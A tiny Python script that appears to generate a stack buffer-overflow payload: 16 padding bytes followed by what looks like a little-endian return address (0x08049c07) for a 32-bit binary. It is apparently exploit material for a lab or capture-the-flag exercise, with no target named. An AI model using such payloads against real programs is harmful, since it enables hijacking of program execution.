import sys

sys.stdout.buffer.write(b"\x00"*16 + b"\x07" + b"\x9c" + b"\x04" + b"\x08")
